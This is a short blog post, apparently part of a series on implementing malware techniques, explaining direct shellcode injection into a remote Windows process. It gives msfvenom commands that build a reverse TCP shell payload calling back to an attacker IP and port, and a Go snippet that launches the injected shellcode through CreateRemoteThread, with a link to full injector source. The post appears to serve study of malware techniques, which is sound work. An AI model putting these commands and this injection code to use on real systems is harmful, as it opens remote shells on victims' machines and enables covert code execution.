---
title: Direct Injection
permalink: /posts/DirectInjection
permalink_name: DirectInjection
---

This is going to be a short post since direct injection is very similar to [DLL injection](/posts/DLLInjection) when it comes to implementation.
I will only highlight the differences between the two techniques, rather than going through the implementation completely.

So, onto the implementation.

First of all, we are going to inject shellcode directly into the target process, rather than injecting a path to a DLL. On Practical Malware Analysis this technique is labelled as “harder” since you need to write your own shellcode. Understandably, writing shellcode is probably more complex than writing a DLL in a high-level programming language.

Of course, that does not matter when you are using Metasploit to generate the payload anyway.

So while in order to create our payload DLL we would go for something like this


```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.119 LPORT=443 -f dll \
      -o reverse.dll
```

we can create our shellcode like so


```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.119 LPORT=443 -f c \
      -b \x00\x0a\x0d
```

The only other difference is in the arguments that we pass to `CreateRemoteThread`.
While with DLL injection the function we wanted to call was `LoadLibraryA` and the path to the DLL in memory was passed as an argument to it, in this case, the function we want to call is out shellcode.
So instead of passing the pointer to `LoadLibraryA` in kernel32.dll we simply pass the pointer we wrote our shellcode to, like this


```go
  r1, _, err = createRemoteThread.Call(
    uintptr(victimProcess),
    uintptr(unsafe.Pointer(nil)),
    0,
    uintptr(addr), // Unilke DLL injection, we start directly 
                   //from the shellcode and we don't pass parameters
    0,
    0,
    uintptr(unsafe.Pointer(nil)))
  if r1 == 0 {
    fmt.Println("[-] Failed to launch remote thread")
    log.Fatal(err)
  }
```

And sure enough this works as inteded :)

Please find the code [here](https://github.com/giacomo270197/Malware_Techniques_Implementations/blob/main/src/injectors/shellcode_injection/injector.go)
